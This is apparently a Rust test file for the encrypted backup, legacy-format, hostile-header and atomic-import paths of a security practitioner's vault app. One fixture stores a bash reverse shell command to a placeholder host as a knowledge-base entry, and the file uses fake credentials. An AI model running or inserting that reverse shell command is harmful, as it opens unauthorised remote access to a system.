//! Backup portability, atomicity and old formats.

use base64::Engine;
use rusqlite::Connection;
use crate::credentials::{self};
use crate::commands::{backup::*, lifecycle::*};
use crate::vault;
use crate::{backup, evidence, fields};
use super::support::*;

#[test]
fn test_backup_envelope_roundtrip_legacy_and_hostile_files() {
    let json = r#"{"version":"1.1","credentials":[],"projects":[],"journal_entries":[],"kb_entries":[]}"#;
    let sealed = seal_backup(json, "backup-pass").unwrap();
    assert!(sealed.starts_with("encra-backup:2:m=262144,t=3,p=1:"));
    assert_eq!(open_backup(&sealed, "backup-pass").unwrap().as_str(), json);
    assert!(open_backup(&sealed, "wrong-pass").is_err());

    // A Cobrypt-era file: "salt:payload", default Argon2, unbound.
    let salt = [5u8; 32];
    let key = vault::derive_key("backup-pass", &salt).unwrap();
    let legacy = format!("{}:{}", base64::engine::general_purpose::STANDARD.encode(salt), vault::encrypt(&key, json).unwrap());
    assert_eq!(open_backup(&legacy, "backup-pass").unwrap().as_str(), json);

    // A crafted header asking for 95 GiB of memory is refused before use.
    let hostile = sealed.replacen("m=262144", "m=99999999", 1);
    assert!(open_backup(&hostile, "backup-pass").unwrap_err().contains("out of range"));
    assert!(open_backup("encra-backup:2:m=262144,t=3,p=1", "backup-pass").is_err());
}

#[test]
fn test_backup_roundtrip_across_vaults() {
    // Regression test for the portability bug: a backup made by one vault
    // must restore into a vault with a different master password, with every
    // field still readable. Previously only the password was decrypted on
    // export, so every other field stayed encrypted under the source key.
    let dir = migration_test_dir("backup-roundtrip");
    let source = dir.join("source.db");
    let destination = dir.join("destination.db");

    let source_dek = create_test_vault(&source, "source-password-123");
    {
        let conn = Connection::open(&source).unwrap();
        seed_vault(&conn, &source_dek);
        bring_up_to_date(&conn, "source-password-123", &source_dek).unwrap();

        // Evidence: the record and its history travel, the file does not.
        let file = dir.join("auth.log");
        std::fs::write(&file, b"Failed password for root from 10.0.0.7").unwrap();
        let staged = evidence::stage(&dir.join("evidence"), &file, &mut |_, _| {}).unwrap();
        let item = evidence::commit(&conn, &source_dek, &dir.join("evidence"), "p1", staged, "").unwrap();
        evidence::add_note(&conn, &source_dek, &item.id, "Copied off the lab VM").unwrap();

        let backup = backup::collect_all(&conn, &source_dek).unwrap();
        assert_eq!(backup.version, "1.1");
        assert_eq!(backup.evidence.len(), 1);
        assert_eq!(backup.evidence[0].custody.len(), 2);
        // Flatten through JSON exactly as the real export path does.
        let json = serde_json::to_string(&backup).unwrap();
        std::fs::write(dir.join("backup.json"), json).unwrap();
    }

    let destination_dek = create_test_vault(&destination, "destination-password-456");
    {
        let json = std::fs::read_to_string(dir.join("backup.json")).unwrap();
        let backup: backup::VaultBackup = serde_json::from_str(&json).unwrap();
        let prepared = backup::prepare_for_import(backup, &destination_dek).unwrap();

        let conn = Connection::open(&destination).unwrap();
        conn.execute_batch("PRAGMA foreign_keys = ON;").unwrap();
        backup::restore_all(&conn, &destination_dek, &prepared).unwrap();
    }

    // Reopen and confirm every field decrypts with the DESTINATION key,
    // through the same read paths the app uses.
    {
        let conn = vault::init_db(&destination).unwrap();
        let key = &destination_dek;

        let list = credentials::list_summaries(&conn, key).unwrap();
        assert_eq!(list.len(), 2, "both credentials must import");
        let github = list.iter().find(|c| c.service == "github.com").expect("names decrypt after import");
        assert_eq!(github.username, "dev@example.com");
        assert!(github.has_totp);
        assert_eq!(credentials::reveal_password(&conn, key, &github.id).unwrap().as_str(), "gh_p@$$w0rd");
        let detail = credentials::detail(&conn, key, &github.id).unwrap();
        assert_eq!(detail.url, "https://github.com");
        assert_eq!(detail.notes, "personal account");
        assert!(credentials::totp_code(&conn, key, &github.id).unwrap().is_some(), "2FA secret must survive");

        // The short password specifically exercises the Base64-padding class
        // of bug that used to break certain ciphertext lengths.
        let aws = list.iter().find(|c| c.service == "aws").unwrap();
        assert_eq!(credentials::reveal_password(&conn, key, &aws.id).unwrap().as_str(), "short12chars");

        let (pid, name, description, target): (String, String, String, String) = conn
            .query_row("SELECT id, name, description, target FROM projects LIMIT 1", [], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?)))
            .unwrap();
        let open = |table: &str, id: &str, column: &str, stored: &str| fields::open_to_string(key, table, id, column, stored).unwrap();
        assert_eq!(open("projects", &pid, "name", &name), "Home Lab");
        assert_eq!(open("projects", &pid, "description", &description), "passive recon");
        assert_eq!(open("projects", &pid, "target", &target), "192.168.1.0/24");

        let (eid, title, content): (String, String, String) = conn
            .query_row("SELECT id, title, content FROM journal_entries LIMIT 1", [], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?)))
            .unwrap();
        assert_eq!(open("journal_entries", &eid, "title", &title), "found open port");
        assert_eq!(open("journal_entries", &eid, "content", &content), "port 22 open");

        let (kid, kb_title, kb_command, kb_desc, kb_tags): (String, String, String, String, String) = conn
            .query_row("SELECT id, title, command, description, tags FROM kb_entries LIMIT 1", [], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?, r.get(4)?)))
            .unwrap();
        assert_eq!(open("kb_entries", &kid, "title", &kb_title), "reverse shell");
        assert_eq!(open("kb_entries", &kid, "command", &kb_command), "bash -i >& /dev/tcp/host/4444 0>&1");
        assert_eq!(open("kb_entries", &kid, "description", &kb_desc), "standard shell");
        assert_eq!(open("kb_entries", &kid, "tags", &kb_tags), "shell,bash");

        let restored = evidence::list(&conn, key, &dir.join("destination-evidence"), &pid).unwrap();
        assert_eq!(restored.len(), 1);
        assert_eq!(restored[0].name, "auth.log");
        assert_eq!(restored[0].hashes.sha256, "ed8e23c5b675f78bc47d0e299f3ad8558cf844ad1ff6ee61d827c76ea0f62373", "hash travels with the record");
        assert!(!restored[0].stored, "only the record was restored");
        let record = evidence::custody(&conn, key, &restored[0].id).unwrap();
        assert!(record.status.intact, "{:?}", record.status.problem);
        let actions: Vec<&str> = record.events.iter().map(|e| e.action.as_str()).collect();
        assert_eq!(actions, ["added", "note", "restored"]);
        assert_eq!(record.events[1].detail, "Copied off the lab VM");

        // Proof that re-encryption really happened: the source key must not
        // be able to read anything the destination now stores.
        assert!(fields::open(&source_dek, "projects", &pid, "name", &name).is_err(), "source key must not read imported cases");
        assert!(fields::open(&source_dek, "journal_entries", &eid, "title", &title).is_err(), "source key must not read imported journal data");
        assert!(fields::open(&source_dek, "kb_entries", &kid, "title", &kb_title).is_err(), "source key must not read imported commands");
    }

    std::fs::remove_dir_all(dir).unwrap();
}

#[test]
fn test_backup_import_is_atomic_on_failure() {
    let dir = migration_test_dir("backup-atomic");
    let source = dir.join("source.db");
    let destination = dir.join("destination.db");

    let source_dek = create_test_vault(&source, "source-password-123");
    let backup = {
        let conn = Connection::open(&source).unwrap();
        seed_vault(&conn, &source_dek);
        bring_up_to_date(&conn, "source-password-123", &source_dek).unwrap();
        backup::collect_all(&conn, &source_dek).unwrap()
    };

    let destination_dek = create_test_vault(&destination, "destination-password-456");
    {
        let conn = Connection::open(&destination).unwrap();
        // Fail the LAST table restore_all touches, after credentials,
        // projects and journal entries have already been inserted.
        conn.execute_batch(
            "CREATE TRIGGER fail_kb_insert BEFORE INSERT ON kb_entries
             BEGIN SELECT RAISE(ABORT, 'injected failure'); END;",
        ).unwrap();

        let prepared = backup::prepare_for_import(backup, &destination_dek).unwrap();
        let result = backup::restore_all(&conn, &destination_dek, &prepared);
        assert!(result.is_err(), "import must fail when a later insert fails");

        let credentials: i64 = conn.query_row("SELECT COUNT(*) FROM credentials", [], |r| r.get(0)).unwrap();
        assert_eq!(credentials, 0, "a failed import must leave no partial data behind");
        let projects: i64 = conn.query_row("SELECT COUNT(*) FROM projects", [], |r| r.get(0)).unwrap();
        assert_eq!(projects, 0, "projects must roll back too");
        let entries: i64 = conn.query_row("SELECT COUNT(*) FROM journal_entries", [], |r| r.get(0)).unwrap();
        assert_eq!(entries, 0, "journal entries must roll back too");
    }

    std::fs::remove_dir_all(dir).unwrap();
}

#[test]
fn test_backup_legacy_payload_is_handled_by_vault_ownership() {
    let source_dek = vault::generate_dek();
    let other_dek = vault::generate_dek();

    // Same vault: the fields really are ciphertext for this key, so the
    // legacy payload still imports rather than being refused.
    assert!(
        backup::prepare_for_import(legacy_v1_backup(&source_dek), &source_dek).is_ok(),
        "a same-vault legacy backup must still be importable"
    );

    // Foreign vault: refuse loudly instead of writing unreadable bytes.
    let error = backup::prepare_for_import(legacy_v1_backup(&source_dek), &other_dek).unwrap_err();
    assert!(error.contains("different vault"), "got: {error}");

    // Unknown future versions are refused rather than guessed at.
    let mut future = legacy_v1_backup(&source_dek);
    future.version = "9.9".into();
    let error = backup::prepare_for_import(future, &source_dek).unwrap_err();
    assert!(error.contains("unsupported backup version"), "got: {error}");
}

#[test]
fn test_backup_prepare_creates_missing_project() {
    let dir = migration_test_dir("backup-missing-project");
    let destination = dir.join("destination.db");
    let dek = create_test_vault(&destination, "destination-password-456");

    let payload = backup::VaultBackup {
        version: "1.1".into(),
        credentials: vec![],
        projects: vec![],
        journal_entries: vec![backup::BackupJournalEntry {
            project_name: "Ghost Engagement".into(),
            title: "orphan entry".into(),
            content: "content".into(),
            entry_type: "note".into(),
            severity: "info".into(),
            created_at: "2026-01-01".into(),
        }],
        kb_entries: vec![],
        evidence: vec![],
    };

    let prepared = backup::prepare_for_import(payload, &dek).unwrap();
    let conn = Connection::open(&destination).unwrap();
    conn.execute_batch("PRAGMA foreign_keys = ON;").unwrap();
    // Would violate the foreign key if the project were not created first.
    backup::restore_all(&conn, &dek, &prepared).unwrap();

    let projects: i64 = conn.query_row("SELECT COUNT(*) FROM projects", [], |r| r.get(0)).unwrap();
    assert_eq!(projects, 1, "the missing project must be created");
    let (pid, stored_name): (String, String) = conn.query_row(
        "SELECT p.id, p.name FROM journal_entries j JOIN projects p ON j.project_id = p.id",
        [], |r| Ok((r.get(0)?, r.get(1)?)),
    ).unwrap();
    assert_eq!(fields::open_to_string(&dek, "projects", &pid, "name", &stored_name).unwrap(), "Ghost Engagement");

    std::fs::remove_dir_all(dir).unwrap();
}

#[test]
fn test_backup_file_round_trip_through_disk() {
    // The path export and import now take: sealed, written owner-only by
    // Rust, read back by Rust, opened with the password.
    let dir = migration_test_dir("backup-file");
    let path = dir.join("encra-backup-2026-11-08.encra");
    let json = r#"{"version":"1.1","credentials":[],"projects":[],"journal_entries":[],"kb_entries":[]}"#;
    let sealed = seal_backup(json, "backup-pass").unwrap();
    crate::commands::files::write_private(&path, sealed.as_bytes()).unwrap();
    let read = crate::commands::files::read_text_capped(&path, 1024 * 1024).unwrap();
    assert_eq!(open_backup(&read, "backup-pass").unwrap().as_str(), json);
    assert!(open_backup(&read, "wrong-pass").is_err());
    std::fs::remove_dir_all(dir).unwrap();
}
